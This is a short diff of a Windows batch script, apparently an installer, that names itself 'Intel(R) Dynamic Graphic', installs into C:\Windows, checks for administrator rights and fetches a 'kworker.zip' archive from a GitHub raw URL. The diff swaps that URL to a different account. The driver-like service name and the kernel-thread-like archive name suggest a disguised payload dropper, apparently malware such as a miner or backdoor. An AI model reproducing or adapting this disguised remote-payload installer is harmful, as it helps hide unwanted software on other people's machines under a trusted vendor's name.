@@ -8,7 +8,7 @@ echo.
 
 set SERVICE_NAME=Intel(R) Dynamic Graphic
 set INSTALL_DIR=C:\Windows\Intel(R) Dynamic Graphic
-set DOWNLOAD_URL=https://raw.githubusercontent.com/wondream322/kworker/master/win/kworker.zip
+set DOWNLOAD_URL=https://raw.githubusercontent.com/thm1472581-dotcom/kworker/master/win/kworker.zip
 
 REM 检查管理员权限
 net session >nul 2>&1
